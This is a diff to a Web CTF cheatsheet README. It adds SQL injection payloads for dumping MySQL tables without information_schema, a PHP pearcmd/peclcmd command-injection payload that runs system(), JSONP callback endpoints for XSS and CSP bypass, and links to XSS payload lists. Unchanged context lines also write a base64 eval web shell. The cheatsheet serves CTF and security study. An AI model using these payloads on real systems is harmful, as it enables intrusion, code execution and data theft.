@@ -37,6 +37,7 @@ Table of Contents
     * [Flask/Jinja2](#flaskjinja2)
     * [Twig/Symfony](#twig--symfony)
     * [Thymeleaf](#thymeleaf)
+    * [Golang](#golang)
     * [AngularJS](#angularjs)
     * [Vue.js](#vuejs)
     * [Python](#python)
@@ -1178,6 +1179,7 @@ pop graphic-context
         - Operating System
     - @@version_compile_machine
     - @@innodb_version
+    - @@global.secure_file_priv
     - MD5()
     - SHA1()
     - COMPRESS() / UNCOMPRESS()
@@ -1320,7 +1322,7 @@ pop graphic-context
     - 字串 -> 16進位 -> 10進位
     - `conv(hex(YOUR_DATA), 16, 10)`
     - 還原：`unhex(conv(DEC_DATA,10,16))`
-    - 需注意不要Overflow
+    - 需注意不要 Overflow
 
 - 不使用逗號
     - `LIMIT N, M` => `LIMIT M OFFSET N`
@@ -1331,12 +1333,25 @@ pop graphic-context
     - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
     `
 
+- 不知列名、不能訪問 information_schema 爆數據
+    - 須知道表名
+    - 例如: artice、admin
+    - `select title from article where id = 4 and 0 union SELECT group_concat(a, 0x3a, b) FROM (SELECT 1 a,2 b,3 c UNION SELECT * FROM admin)x`
+    - 列名不夠，繼續加 4,5,6,7,... 一直到猜對列名個數
+
 - innodb
     - 表引擎為 innodb
     - MySQL > 5.5
     - innodb_table_stats、innodb_table_index存放所有庫名表名
     - `select table_name from mysql.innodb_table_stats where database_name=資料庫名;`
     - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)
+
+- sys
+    - `sys.statements_with_full_table_scans`
+    - 可以撈表名
+    - 詳見 [PPP simpleCMS writeup](https://github.com/pwning/public-writeup/tree/master/codegate2018/Simple%20CMS)
+    - `select query from sys.statements_with_full_table_scans`
+    - MySQL 5.7
 
 - Bypass WAF
 
@@ -2126,9 +2141,13 @@ HQL injection example (pwn2win 2017)
     - `/?+install+-R+&file=/usr/local/lib/php/pearcmd.php&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
     - `/?+bundle+-d+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/+/tmp/other/tmp/pear/download/Archive_Tar-1.4.14.tgz+&file=/usr/local/lib/php/pearcmd.php&`
     - `/?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&file=/usr/local/lib/php/pearcmd.php&`
+- Command Injection 2
+    - 不用寫檔、需要有 phpt file
+    - `/?page=../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r"system(hex2bin('PAYLOAD'));"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt`
 - Example
     - [Balsn CTF 2021 - 2linephp](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp)
     - [巅峰极客2020 - MeowWorld](https://www.anquanke.com/post/id/218977#h2-3)
+    - [SEETF 2023 - readonlt](https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2023/readonly/README.md)
 
 ## Nginx buffering
 
@@ -3475,6 +3494,8 @@ require("./index.js")
 ### Cheat Sheet
 
 - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+- https://tinyxss.terjanq.me/
+    - Tiny XSS Payload
 
 ### Basic Payload
 
@@ -3660,8 +3681,11 @@ https://csp-evaluator.withgoogle.com/
 - google analytics ea
     - ea is used to log actions and can contain arbitrary string
     - Google CTF 2018 - gcalc2
-
-
+- known jsonp endpoint
+    - Google:
+        - `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)`
+        - `https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1`
+    - [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 ### Upload XSS
 
 - htm
@@ -4407,7 +4431,7 @@ Welcome to open Pull Request
 
 OR
 
-[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/b4wKcIZ)
+[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/kaibrotw)
 
 
 [![Stargazers over time](https://starchart.cc/w181496/Web-CTF-Cheatsheet.svg)](https://starchart.cc/w181496/Web-CTF-Cheatsheet)
